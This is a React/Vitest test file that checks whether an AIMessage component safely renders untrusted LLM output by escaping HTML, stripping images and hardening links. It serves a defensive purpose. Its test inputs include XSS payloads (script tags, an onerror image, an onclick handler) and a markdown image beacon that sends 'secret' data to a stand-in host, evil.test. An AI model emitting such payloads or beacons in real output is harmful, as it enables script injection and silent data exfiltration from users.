import { render, screen } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';

import { AIMessage } from './AIMessage';

// These tests are the DoD proof for the security surface (NIC-1756). Assistant
// output is untrusted LLM text; the hardened markdown config must escape raw HTML,
// strip images, and force safe links. AIMessage is rendered directly (no i18n /
// store needed for an assistant turn with no error state).
describe('AIMessage — hardened markdown (security)', () => {
  // AC1 — raw HTML in model output renders as escaped text, never as live nodes.
  it('escapes raw HTML instead of creating live DOM nodes', () => {
    const { container } = render(
      <AIMessage role="assistant" content={'Before <script>alert(1)</script> <b>bold</b> after'} />
    );

    // No live script/bold nodes were created from the raw HTML.
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('b')).toBeNull();
    // The tags survive as visible, escaped text.
    expect(screen.getByTestId('ai-message-assistant')).toHaveTextContent('<script>alert(1)</script>');
    expect(screen.getByTestId('ai-message-assistant')).toHaveTextContent('<b>bold</b>');
  });

  it('renders no element with dangerouslySetInnerHTML-injected content', () => {
    // An img tag written as raw HTML must not become an <img>, and an event-handler
    // attribute must never reach the DOM.
    const { container } = render(
      <AIMessage role="assistant" content={'<img src=x onerror="alert(1)"> <div onclick="evil()">x</div>'} />
    );

    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('[onerror]')).toBeNull();
    expect(container.querySelector('[onclick]')).toBeNull();
  });

  // AC2 — a markdown image node is stripped; no img element, no network GET.
  it('strips a markdown image and fires no network request for it', () => {
    const fetchSpy = vi.spyOn(globalThis, 'fetch');
    const { container } = render(
      <AIMessage role="assistant" content={'Look ![exfil](https://evil.test/pixel.png?data=secret) here'} />
    );

    expect(container.querySelector('img')).toBeNull();
    // No <img> means no auto GET; belt-and-braces, nothing called fetch either.
    expect(fetchSpy).not.toHaveBeenCalled();
    // unwrapDisallowed keeps the surrounding text.
    expect(screen.getByTestId('ai-message-assistant')).toHaveTextContent('Look');
    expect(screen.getByTestId('ai-message-assistant')).toHaveTextContent('here');
    fetchSpy.mockRestore();
  });

  // AC3 — markdown links are anchors with target=_blank + rel=noopener noreferrer.
  it('renders markdown links with safe target and rel', () => {
    const { container } = render(<AIMessage role="assistant" content={'See [the docs](https://example.com/docs)'} />);

    const anchor = container.querySelector('a');
    expect(anchor).not.toBeNull();
    expect(anchor).toHaveAttribute('href', 'https://example.com/docs');
    expect(anchor).toHaveAttribute('target', '_blank');
    expect(anchor).toHaveAttribute('rel', 'noopener noreferrer');
  });

  it('renders GFM markdown (bold, lists, code) as real elements', () => {
    const { container } = render(<AIMessage role="assistant" content={'**bold**\n\n- one\n- two\n\n`inline`'} />);

    expect(container.querySelector('strong')).not.toBeNull();
    expect(container.querySelectorAll('li')).toHaveLength(2);
    expect(container.querySelector('code')).not.toBeNull();
  });

  it('renders a user turn as plain text (no markdown parsing)', () => {
    const { container } = render(<AIMessage role="user" content={'**not bold** [not a link](https://x.test)'} />);

    // User input is their own text — not parsed, so no anchor/strong nodes.
    expect(container.querySelector('a')).toBeNull();
    expect(container.querySelector('strong')).toBeNull();
    expect(screen.getByTestId('ai-message-user')).toHaveTextContent('**not bold** [not a link](https://x.test)');
  });
});
